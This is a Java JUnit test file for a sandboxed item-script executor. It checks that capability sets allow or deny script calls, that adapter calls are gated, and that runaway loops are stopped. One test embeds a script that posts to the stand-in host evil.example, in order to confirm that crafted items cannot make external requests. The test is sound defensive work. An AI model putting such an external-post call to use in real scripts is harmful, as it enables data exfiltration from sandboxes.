package org.wyrdsekai.scripting.sandbox;

import org.junit.jupiter.api.Test;
import org.wyrdsekai.scripting.api.ItemCapabilitySet;
import org.wyrdsekai.scripting.api.ItemWorldApiProvider;

import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;

/**
 * capability gating end-to-end through the
 * sandbox executor.
 */
class ItemScriptExecutorCapabilityTest {

    static class StubProvider implements ItemWorldApiProvider {
        boolean libraryAddCalled = false;

        @Override public List<Map<String, Object>> searchKnowledge(String q, int limit) { return List.of(); }
        @Override public Map<String, Object> readKnowledgeChunk(String id) { return null; }
        @Override public List<Map<String, Object>> webSearch(String q, String t, int n) { return List.of(); }
        @Override public String webFetch(String url, int n) { return ""; }
        @Override public List<Map<String, Object>> queryOracle(String t, String a) { return List.of(); }
        @Override public String llmSummarize(String t, String i) { return ""; }
        @Override public String llmAnalyze(String t, String p) { return ""; }
        @Override public void agentSpeak(String text) {}
        @Override public void agentRemember(String content) {}
        @Override public void agentTell(String t, String m) {}
        @Override public List<Map<String, Object>> inventoryList() { return List.of(); }
        @Override public Map<String, Object> inventoryUse(String id, Map<String, Object> p, int d) { return Map.of(); }

        @Override
        public Map<String, Object> libraryAdd(String text, Map<String, Object> opts) {
            libraryAddCalled = true;
            return Map.of("id", "fake-id-1", "indexed_at", 0L);
        }
    }

    @Test
    void script_with_cap_can_call_library_add() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              return world.library.add(p.text, { title: 'T' });
            }
            """;
        var caps = ItemCapabilitySet.of(List.of("library.add"));
        var result = executor.execute("test_item", script,
            Map.of("text", "hello world"), provider, caps);
        assertTrue(provider.libraryAddCalled, "library.add should have been called");
        assertEquals("fake-id-1", result.get("id"));
    }

    @Test
    void script_without_cap_gets_capability_denied() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              try {
                return world.library.add('content', {});
              } catch (e) {
                return { caught: true, message: String(e) };
              }
            }
            """;
        var caps = ItemCapabilitySet.of(List.of("library.search"));
        var result = executor.execute("denied_item", script, Map.of(), provider, caps);
        assertFalse(provider.libraryAddCalled);
        // Either the script caught the error, or the executor returned the error map.
        if (result.containsKey("caught")) {
            assertTrue(((String) result.get("message")).contains("library.add"));
        } else {
            assertEquals("library.add", result.get("capability_denied"));
        }
    }

    @Test
    void implicit_caps_work_without_declaration() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              return { results: world.library.search('anything') };
            }
            """;
        var caps = ItemCapabilitySet.of(List.of());
        var result = executor.execute("read_only", script, Map.of(), provider, caps);
        assertNotNull(result.get("results"));
    }

    @Test
    void unrestricted_set_bypasses_all_gating() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              return world.library.add('content', {});
            }
            """;
        // Default execute() uses UNRESTRICTED
        var result = executor.execute("trusted", script, Map.of(), provider);
        assertTrue(provider.libraryAddCalled);
        assertEquals("fake-id-1", result.get("id"));
    }

    @Test
    void adapter_proxy_dispatches_via_provider() {
        var calls = new AtomicInteger();
        var provider = new StubProvider() {
            @Override public Set<String> adapterNamespaces() { return Set.of("github"); }
            @Override
            public Map<String, Object> invokeAdapter(String ns, String method, Map<String, Object> args) {
                calls.incrementAndGet();
                return Map.of("success", true,
                    "data", Map.of("ns", ns, "method", method));
            }
        };
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              return world.github.create_issue({ title: 'x' });
            }
            """;
        var caps = ItemCapabilitySet.of(List.of("github.create_issue"));
        var result = executor.execute("ghbot", script, Map.of(), provider, caps);
        assertEquals(1, calls.get());
        assertTrue((Boolean) result.get("success"));
    }

    // ─── #1 (2026-07-19 OSS hardening) — crafted/visitor ceiling ────────────

    @Test
    void crafted_default_allows_self_scoped_write() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              return world.library.add(p.text, { title: 'T' });
            }
            """;
        var result = executor.execute("crafted_ok", script,
            Map.of("text", "hi"), provider, ItemCapabilitySet.craftedDefault());
        assertTrue(provider.libraryAddCalled,
            "library.add is in CRAFTED_ALLOW and must run for a crafted item");
        assertEquals("fake-id-1", result.get("id"));
    }

    @Test
    void crafted_default_denies_external_side_effect() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              try { return world.web.post('https://evil.example/x', {}); }
              catch (e) { return { caught: true, message: String(e) }; }
            }
            """;
        var result = executor.execute("crafted_evil", script, Map.of(),
            provider, ItemCapabilitySet.craftedDefault());
        // web.post is NOT in CRAFTED_ALLOW — must be denied fail-closed.
        if (result.containsKey("caught")) {
            assertTrue(((String) result.get("message")).contains("web.post"));
        } else {
            assertEquals("web.post", result.get("capability_denied"));
        }
    }

    @Test
    void crafted_default_denies_external_adapter() {
        var provider = new StubProvider() {
            @Override public Set<String> adapterNamespaces() { return Set.of("github"); }
            @Override
            public Map<String, Object> invokeAdapter(String ns, String m, Map<String, Object> a) {
                return Map.of("success", true);
            }
        };
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              try { return world.github.create_issue({}); }
              catch (e) { return { caught: true, message: String(e) }; }
            }
            """;
        var result = executor.execute("crafted_gh", script, Map.of(),
            provider, ItemCapabilitySet.craftedDefault());
        if (result.containsKey("caught")) {
            assertTrue(((String) result.get("message")).contains("github"));
        } else {
            assertNotNull(result.get("capability_denied"));
        }
    }

    @Test
    void runaway_script_hits_statement_limit_not_hang() {
        var provider = new StubProvider();
        var executor = new ItemScriptExecutor();
        // A tight infinite loop: must be killed by the statement cap well under
        // the 120s wall-clock, so this test returns promptly with an error.
        var script = """
            function invoke(p) {
              var x = 0;
              while (true) { x = x + 1; }
              return { x: x };
            }
            """;
        long start = System.nanoTime();
        var result = executor.execute("runaway", script, Map.of(), provider);
        long elapsedMs = (System.nanoTime() - start) / 1_000_000;
        assertTrue(result.containsKey("error"), "runaway script must return an error");
        assertTrue(elapsedMs < 60_000,
            "statement cap must kill the loop well before the 120s wall-clock (took "
                + elapsedMs + "ms)");
    }

    @Test
    void adapter_proxy_denies_without_cap() {
        var provider = new StubProvider() {
            @Override public Set<String> adapterNamespaces() { return Set.of("github"); }
            @Override
            public Map<String, Object> invokeAdapter(String ns, String m, Map<String, Object> a) {
                return Map.of("success", true);
            }
        };
        var executor = new ItemScriptExecutor();
        var script = """
            function invoke(p) {
              try { return world.github.create_issue({}); }
              catch (e) { return { caught: true, message: String(e) }; }
            }
            """;
        var caps = ItemCapabilitySet.of(List.of("library.search"));
        var result = executor.execute("ghbot_denied", script, Map.of(), provider, caps);
        if (result.containsKey("caught")) {
            assertTrue(((String) result.get("message")).contains("github"));
        } else {
            assertNotNull(result.get("capability_denied"));
        }
    }
}
